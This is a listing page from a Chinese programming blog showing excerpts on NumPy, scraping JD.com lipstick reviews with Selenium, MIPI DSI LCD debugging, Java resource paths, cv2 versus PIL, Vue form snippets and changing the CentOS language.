数组和单个数字之间也可以进行运算操作(即向量和标量之间的运算)。比如说，数组表示以英里为单位的距离，希望将其单位转换为千米。只需输入 data * 1.6 即可：
NumPy 是通过广播机制(broadcasting)来实现的，通过判断维数，来推测要进行的运算。
索引 可以像对 python 列表进行切片一样，对 NumPy 数组进行任意的索引和切片：
聚合 NumPy 还提供聚合功能：
除了 min、max 和 sum 之外，还可以使用 mean 得到平均值，使用 prod 得到所有元素的乘积，使用 std 得到标准差等等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b30ee9cd2c6d86edb3ec1495c4b09fca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35685700f5a68bd1babdbd44ee2fce98/" rel="bookmark">
			selenium怎么取得源代码中没有的数据_到底应该怎么选口红色号？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		到底应该怎么选口红色号？ 引言 相信对很多男生来说，选口红色号应该是最最最难的事了，明明看着都是一样的颜色....但是问题就是用来解决的！仔细观察了一下京东评论页面，发现每一条评论下都标有评论者购买的色号，因此将这个信息做为抓取内容，统计并可视化哪种色号被购买的最多。
本文以香奈儿（Chanel ）炫亮魅力唇膏丝绒系列为爬取对象。
相关模块 selenium：爬取动态网页并自动翻页 bs4：解析HTML文件 pandas：读取和存储csv文件 jieba：中文分词 collections：统计词频 pyecharts：可视化数据 可视化 各色号的购买人数可视化结果如下。
再来可视化一下评论内容。 数据爬取 首先查看了一下网页源代码，发现没有评论内容，因此判断该网页是一个动态加载的网页，常用的requests和scrapy爬虫都无法爬取其中内容。所以我选择了之前使用过的selenium库作为爬取工具。
接着分析一下网页结构。位置很明显，而且大多数京东评论网页的结构都是这样的。
然后就可以开始抓取这部分信息了。简单的bs4库解析HTML文件，抓取到信息后存储在列表中。
下一步就是自动翻页，毕竟不能只爬十条评论信息。selenium是一个模拟浏览器的库，因此实现自动翻页也是很方便的。
在实现抓取内容和自动翻页两个功能后，加入循环，确定一下自己要爬取多少页内容就可以了。
最后将爬取的结果转为Series类型的数据并写入csv文件，方便之后可视化。
既然到了已经在爬取评论信息了，所以也一并爬取一下评论内容， 具体流程和上面的一样，但是最后写入了txt文件，方便之后的分词处理和可视化为词云。
得到数据后，就可以开始可视化了，可视化我选择了选择非常火的pyecharts库，确实是功能强大，可操作性很强。由于这组数据数量上相差比较悬殊，因此只画了玫瑰图看看。放上可视化代码，强烈建议实战之前看一下官网文档，Demo写得很详细。
可视化完色号信息后，再绘制一下评论区内容的词云图。
首先是去掉文本内容中的标点符号，使用re库中的sub函数很容易的实现这一功能。
然后使用jieba库分词，再统计词频。注意：pyecharts绘制词云时，输入的应该是(词，词频)的元组形式。
最后用得到的元组列表绘制词云。
最后 原文链接：
到底应该怎么给女朋友选口红色号？​mp.weixin.qq.com 如果觉得本文还可以，还请各位点个赞。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/791c79b493e5b011779d952e9f568be3/" rel="bookmark">
			LCD之mipi DSI接口驱动调试流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转发路径：https://blog.csdn.net/liwei16611/article/details/68146912
1.lcd MIPI DSI协议
MIPI-DSI是一种应用于显示技术的串行接口，兼容DPI(显示像素接口，Display Pixel Interface)、DBI(显示总线接口，Display Bus Interface)和DCS(显示命令集，Display Command Set)，以串行的方式发送像素信息或指令给外围，而且从外围中读取状态信息或像素信息，而且在传输的过程中享有自己独立的通信协议，包括数据包格式和纠错检错机制。
MIPI-DSI具备高速模式和低速模式两种工作模式，全部数据通道都可以用于单向的高速传输，但只有第一个数据通道才可用于低速双向传输，从属端的状态信息、像素等式通过该数据通道返回。时钟通道专用于在高速传输数据的过程中传输同步时钟信号。此外，一个主机端可允许同时与多个从属端进行通信。
LCD mipi系统简单示意图如下：
1.1、mipi DSI协议分层 主要分为四个层：应用层、协议层、通道管理层、物理层
1.2、物理层 在接收到低速发送请求时，逻辑电路将待发送的指令或数据串行化，并控制输出高摆幅低功耗电平进行低功耗传送请求，随后将指令或数据串行地加载到通道，接收端则识别传送模式完成串行数据的并行转换。
当接收到高速请求后，电路发送高摆幅低功耗电平进行高速传送请求，然后将待发送数据经过串行转换之后驱动差分驱动模块以低摆幅信号在通道上传送，接收端则识别高速模式后正确地检测其同步信号将高速串行数据完成串并转换成功地接收。
除此之外，总线控制权可在主机端与从属端之间交换，发送端发送放弃总线请求，接收端接收请求之后控制总线发起应答，总的过程为TA(turn around)操作，在LCD中我们称之为BTA（Bus Turn-Around）。当主机端需要获取从属端接收数据的状况或者读取显示模块的参数或显示数据的时候，主机端发起TA操作，在从属端发送数据完毕之后自动发起TA操作，归还总线控制权。
信号两种工作状态，高速模式状态（LP）和低速模式状态（HS）。
物理层，就是要控制硬件信号的（时序），MIPI-DSI两种信号类型: 时钟lane,两根线一个Dp,Dn；
数据lane,两根线一个Dp，Dn；
数据lane根据需求有多个，最少一个lane（lane0），最多4个lane（lane0,lane1,lane2,lan3）,其中只有lane0是双向的（低速模式双向，高速模式也只能是单向），其他的都只能是单向（高速模式单向）。
数据lane电平：
低速模式LP：0-1.2V，空闲电平（LP11）Dp,Dn是1.2V。
高速模式HS：100-300mV (200mV) 按照D-PHY协议，在整个协议的物理层中，在主机端和从属端之间采用的是同步连接，时钟通道用于传送高速时钟，一个或多个数据通道用于传送低功耗数据信号或高速数据信号每一个通道都是利用两根互连线实现主机端和从属端的连接，并且支持高速模式和低速ESCAPE模式。
在高速模式下，发送端同时驱动该通道仅有的两根互连线，输出低摆幅差分信号，例如200mV；
低速模式下，发送端分别驱动互连线，各自输出单端信号，但摆幅相对较大，例如1.2V，如下图所示：
差分发送模块(HS_TX)以差分信号驱动互连线，高速通道上呈现两种状态：differential-0和differential-1。低功耗单端发送模块(LP_TX)独立地驱动两根互连线，通道上则有四种不同的状态：LP00、LP01、LP10和LP11。协议针对线路电平作了具体的定义并设置了三种工作模式：高速模式、控制模式和ESCAPE模式，通道默认为控制模式，线路处于STOP状态。当通道需要进入高速模式或ESCAPE模式，发送模块则需驱动线路为LP01或LP10向接收端发送请求，发送完请求序列之后便进行相应工作模式，发送LP11
便可退出结束传送回到STOP控制状态。接收端需要时刻进行LP-RX接收，侦测线路电平明确通道的工作模式。
1.2.1、时钟通道 时钟通道支持高速模式和ULPS（超低功耗模式）模式：
高速模式应用于整个接口工作于高速数据传送模式，用于传送高速时钟：
ULPS模式用于外围（如整个显示模块）要进入休眠模式时将时钟通道置于超低功耗状态，节省外围接口功耗。
1.2.2、数据通道 数据通道支持高速模式和ESCAPE模式，在此还包括另外一个重要的功能总线控制权交换——BTA模式。高速模式是以高速的低摆幅差分信号传送数据，速度快，最高可达
1Gps。在经过请求序列LP11-&gt;LP01-&gt;LP00之后，HS_TX开始发送串行高速数据，发送结束之后，LP_TX发送LP11回到正常的控制模式。
ESCAPE模式是由LP_TX直接驱动线路通道发送电平序列传送低功耗数据。其进入方式为LP11-&gt;LP10-&gt;LP00-&gt;LP01-&gt;LP00，退出方式为LP10-&gt;LP11。经过请求序列之后，LP_TX发送模式命令，包括trigger命令和低功耗数据传送（LPDT）等，如下如所示：
BTA模式用于交换总线控制权，在控制模式下完成。LP_TX发送请求序列LP11-&gt;LP10-&gt;LP00-&gt;LP10-&gt;LP00，经过BTA-GO之后停止驱动总线。相对于总线另一端来说，在接收到请求序列并且经过BTA-SURE之后，LP_TX开始驱动总线，发送确认信号，接管总线。
1.3、通道管理层 依据设计所设定最多为4个数据通道，该层在发送端将需要发送的数据按照通道次序分成N组输送到相应的数据通道，使其经数据通道同时发送至从属端。在接收端，该层需要做的是将接收到的N组数据组合在一起恢复成原始的数据序列。
数据分组与恢复如下图：
数据分组： 数据恢复：
数据操作过程：
1.4、协议层 信息传送采用数据包格式，包括长数据包和短数据包。发送数据的时候，将数据按照信息类型及内容进行压包，完成ECC码的生成和CRC码的添加。接收数据的时候，依据ECC码和CRC码就整个数据包进行检错纠错，完成对包头和数据内容的译码并合理输送到应用层中。
DSI协议是一个基于数据包传送的通信协议，主机端和显示模块之间传送的命令和数据基本上都以数据包格式进行。DSI所定义的数据包有两种：端数据包(short packet) 和长数据包(long packet)，短数据包主要用于传输命令、读写寄存器，长数据包主要用用于传输大量图象数据或部分控制命令。
1.5、应用层 根据应用模块的需要，在发送端对发送的命令和数据进行初步编码转化为MIPI-DSI所规定的格式，而在接收端则将接收的数据还原为应用模块所支持的数据格式及时序要求。
应用层模块直接连接到显示模块，负责着与显示模块的通信。按照协议要求，接口电路支持命令模式和视频模式，命令模式则是经过接口转换之后主机端依然得以“命令+参数”格式对显示模块进行读写操作，而视频模式下，主机端可以直接将显示数据写入显示模块，无需命令操作，实时显示视频。该模块在设计的过程中应支持命令模式和视频模式。
根据协议所定义的数据类型的意义，其中一些数据类型是专门应用于video模式，如0x01指代的是场同步信号(Vsync)开始。所以在此模块电路的设计中，分成了视频模式应用电路和命令模式应用电路两个模块，视频模式应用电路模块仅接收视频模式相关的命令和数据并以DPI时序格式传送到驱动中。
cmd模式应用电路模块适用于非视频模式的控制命令和数据，对其进行译码并以DBI时序格式写入到显示模块中的寄存器或SRAM中。当需要读取数据的时候，命令模式应用电路模块通过DBI口可从显示模块中读取相关寄存器的信息等。
mipi总体框图：
2、MIPI DSI实践 2.1、mipi速率 mipi_clk = resX * resY * bps * 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/791c79b493e5b011779d952e9f568be3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dec315c2e7956336657edb0241229dd4/" rel="bookmark">
			java中获取配置文件路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何获取资源文件的路径 通过类加载器的getResource方法获取资源的文件需要在resource路径下。因为getResource会在classes目录下寻找文件。而/src/main/java和/src/main/resource都会将文件编译到classes目录下。 @Test public void test5() { Class cls = this.getClass();//当前类 ClassLoader loader = cls.getClassLoader();//获取类加载器 String xmlFile = "./static/test.xml"; String url1 = ""; String url2 = ""; if (loader != null) { URL resource = loader.getResource(xmlFile); if(resource==null){ System.out.println("未找到资源文件"); } //两种都可以获取到路径 url1 = loader.getResource(xmlFile).getPath(); url2 = loader.getResource(xmlFile).getFile(); } System.out.println(url1); System.out.println(url2); } 项目目录结构为：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7eacfadc4d91490dcbe1dc367c4527d2/" rel="bookmark">
			cv2 PIL区别笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 scipy.misc.imread 读取的图片数据是 RGB 格式；
使用 cv2.imread 读取的图片数据是 BGR 格式；
使用 PIL.Image.open 读取的图片数据是RGB格式；
58 import cv2 59 from PIL import Image 61 img = cv2.imread("/tmp-data/caihuanqia/compare/source/235.jpg") 62 print("cv2:", img.shape) 63 img2 = Image.open("/tmp-data/caihuanqia/compare/source/235.jpg") 对于单通道的图片：
可以看出Image读取就是默认的单通道，但是cv2会默认转化围为3通道，并且数值也变了。需要加上cv2.IMREAD_UNCHANGED，即cv2.imread(“ceshi.png”，cv2.IMREAD_UNCHANGED)
4 pil = Image.open("ceshi.png") 5 cv = cv2.imread("ceshi.png") 6 pil2cv2 = np.array(pil) 7 print("cv2.shape:", cv.shape) 8 print("pil:", pil2cv2.shape) (‘cv2.shape:’, (2048, 2048, 3))
(‘pil:’, (2048, 2048))
加上cv2.imread(“ceshi.png”，cv2.IMREAD_UNCHANGED)
58 import cv2 59 from PIL import Image 60 import numpy as np 61 time1 = time.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7eacfadc4d91490dcbe1dc367c4527d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ded8c2f418ccad4cc0949a450106c1d/" rel="bookmark">
			前端的一些功能实现总结（持续更新）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、实现前端复制
2、前端生成UUID
3、前端input实现输入校验座机和手机号码
4、vue表单常用的正则验证[邮箱，手机号，密码，固话，微信号等]
5、el-select宽度设置
6、前端导出pdf
1、vue实现前端复制 亲测可用
&lt;p class="inline-block"&gt; &lt;span &gt;{{fenxiao.appSecret}}&lt;/span&gt; &lt;span style="color: #0000FF;cursor: pointer" @click="copyAppSecret"&gt;复制&lt;/span&gt; &lt;/p&gt; copyAppSecret() { let createInput = document.createElement("input"); createInput.value = this.fenxiao.appSecret; document.body.appendChild(createInput); createInput.select(); // 选择对象 document.execCommand("Copy"); // 执行浏览器复制命令 createInput.style.display = "none"; this.$message({ message: "复制成功", type: "success" }); }, 参考 ：https://www.cnblogs.com/myfirstboke/p/10469584.html
go
参考：https://www.jb51.net/article/138258.htm
2、前端生成UUID JavaScript生成GUID的算法
3、input输入框限制（座机，手机号码） 座机
&lt;input style="width:100px;" id="tel" type="text" onkeyup="value=value.replace(/[^\d\-\d]/g,'')" maxlength=20&gt;&lt;/input&gt; 手机
&lt;input style="width: 100px;" id="mobile" type="text" onkeyup="value=value.replace(/[^\d]/g,'')" maxlength=11&gt;&lt;/input&gt; 参考
https://blog.csdn.net/mei_jian_xue/article/details/92797286
4、vue表单常用的正则验证[邮箱，手机号，密码，固话，微信号等] 冲
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ded8c2f418ccad4cc0949a450106c1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f82374ac653451b2a7654a23ac77703/" rel="bookmark">
			CentOS系统如何修改语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日常中大家在使用Centos过程都会因为英文不熟悉而造成不方便，今天数脉科技就位大家介绍Centos系统如何修改语言。
CentOS6系统修改语言方法如下：
1.用root登录系统，密码为创建虚拟机时候的密码。创建虚拟机的时候使用的用户名为：
admin，密码：admin
这个时候用root/admin登录即可
2.登录成功之后，进到/etc/sysconfig目录，打开i18n文件，修改文件内容
vi /etc/sysconfig/i18n
LANG=“en_US.UTF-8”
LANG=“zh_CN.UTF-8”
3.保存文件
4.执行：source /etc/sysconfig/i18n 以使修改生效
5.ok
CentOS7系统修改语言方法如下：
Centos 7已经不采用/etc/sysconfig/i18n这一个文件来做配置，而改为使用/etc/locale.conf这个来进行语言配置。
使用vi命令进去，vi /etc/locale.conf
#LANG=“zh_CN.UTF-8”
LANG=“en_US.UTF-8”
重启
如果系统没有中文支持，可以通过网上下载安装中文语言包,使用命令：yum groupinstall Chinese-support
希望以上的内容对大家在使用Centos过程有所帮助
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/226/">«</a>
	<span class="pagination__item pagination__item--current">227/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/228/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>